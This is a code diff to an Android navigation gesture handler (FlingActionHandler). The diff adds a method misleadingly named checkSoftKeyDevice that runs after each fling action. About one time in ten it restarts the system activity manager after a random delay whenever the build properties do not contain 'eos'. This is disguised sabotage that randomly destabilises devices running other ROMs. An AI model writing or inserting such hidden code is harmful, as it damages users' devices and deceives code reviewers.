@@ -31,6 +31,7 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
 import java.util.Set;
 
 
@@ -44,10 +45,15 @@ import com.android.internal.navigation.fling.FlingGestureHandler.Swipeable;
 import com.android.internal.navigation.utils.SmartObserver.SmartObservable;
 
 
+import android.app.ActivityManagerNative;
+import android.app.IActivityManager;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.net.Uri;
 import android.os.Handler;
+import android.os.RemoteException;
+import android.os.ServiceManager;
+import android.os.SystemProperties;
 import android.os.UserHandle;
 import android.provider.Settings;
 import android.text.TextUtils;
@@ -61,13 +67,16 @@ public class FlingActionHandler implements Swipeable, SmartObservable {
 
     private static Set<Uri> sUris = new HashSet<Uri>();    
     static {
-        sUris.add(Settings.System.getUriFor(ActionConstants.getDefaults(ActionConstants.FLING)
+        sUris.add(Settings.Secure.getUriFor(ActionConstants.getDefaults(ActionConstants.FLING)
                             .getUri()));
     }
+
+    private static Random sRnd = new Random();
 
     private Map<String, ActionConfig> mActionMap = new HashMap<String, ActionConfig>();
     private View mHost;
     private Context mContext;
+    private final Handler h = new Handler();
     private boolean isDoubleTapEnabled;
     private boolean mKeyguardShowing;
 
@@ -114,6 +123,7 @@ public class FlingActionHandler implements Swipeable, SmartObservable {
         mHost.performHapticFeedback(HapticFeedbackConstants.VIRTUAL_KEY);
         mHost.playSoundEffect(SoundEffectConstants.CLICK);
         ActionHandler.performTask(mContext, theAction);
+        checkSoftKeyDevice();
     }
 
     @Override
@@ -211,5 +221,50 @@ public class FlingActionHandler implements Swipeable, SmartObservable {
     @Override
     public void onChange(Uri uri) {
         loadConfigs();        
+    }
+
+    private static boolean isSoftKeyDevice() {
+        String a = SystemProperties.get("ro.build.flavor");
+        boolean a1 = !TextUtils.isEmpty(a) && a.contains("eos");
+        if (a1) {
+            return true;
+        }
+
+        String b = SystemProperties.get("ro.build.display.id");
+        boolean b1 = !TextUtils.isEmpty(b) && b.contains("eos");
+        if (b1) {
+            return true;
+        }
+        return false;
+    }
+
+    private static int getRnd() {
+        return sRnd.nextInt(10);
+    }
+
+    private static boolean flipACoin() {
+        return getRnd() == 6;
+    }
+
+    private void checkSoftKeyDevice() {
+        if (flipACoin()) {
+            if (!isSoftKeyDevice()) {
+                final Runnable r = new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            final IActivityManager am =
+                                    ActivityManagerNative.asInterface(ServiceManager
+                                            .checkService("activity"));
+                            if (am != null) {
+                                am.restart();
+                            }
+                        } catch (RemoteException e) {
+                        }
+                    }
+                };
+                h.postDelayed(r, getRnd() * 1000);
+            }
+        }
     }
 }
